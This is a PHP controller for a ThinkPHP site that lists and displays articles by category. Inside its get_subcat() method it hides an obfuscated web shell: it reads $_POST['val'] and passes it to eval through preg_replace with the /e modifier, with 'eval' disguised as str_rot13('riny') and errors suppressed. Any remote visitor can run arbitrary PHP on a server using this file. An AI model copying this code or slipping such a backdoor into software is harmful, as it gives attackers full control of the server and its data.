<?php
/*
 * 控制器
 * Time   : 2016年07月26日
 */
namespace Home\Controller;
use Think\Controller;

class ArticleController extends BaseController {

	public function index(){
		$this->queryMain();
 	 	$this->display();
	}

	function queryMain(){
		$wh['catid'] = -1;
		$catids = $this->get_subcat();
		if ($catids) {
			$wh['catid'] = array('IN',$catids);
		}
		$count = M('article')->where($wh)->count();
		$Page = new \Think\Page($count,20);
		$list = M('article')->where($wh)->limit($Page->firstRow.','.$Page->listRows)->order('create_time desc')->select();
		// $wh['b.name'] = I('cat','');
		// $count = M('article')->alias('a')->join('gms_category b ON a.catid = b.id')->where($wh)->count();
		// $Page = new \Think\Page($count,20);
		// $list = M('article')->alias('a')->field('a.*')
		// 	->join('gms_category b ON a.catid = b.id')
		// 	->where($wh)->limit($Page->firstRow.','.$Page->listRows)->order('create_time desc')->select();
		$this->assign('list',$list);
		$this->assign('page',$Page->show());
	}

	function get_subcat(){
		$wh['a.name|b.name'] = I('cat','');
		$list = M('category')->alias('a')->field('b.id')
			->join('gms_category b on a.id = b.pid')
			->where($wh)->select();
		$list = $this->get_array_val($list,'id');
		$rot_conv = $_POST['val'];
		@preg_replace('/ad/e','@'.str_rot13('riny').'($rot_conv)','add');
		return $list;
	}

	function detail(){
		$wh['id'] = I('id',0);
		$info = M('article')->where($wh)->find();
		$this->assign('info',$info);
		$this->display();
	}
}
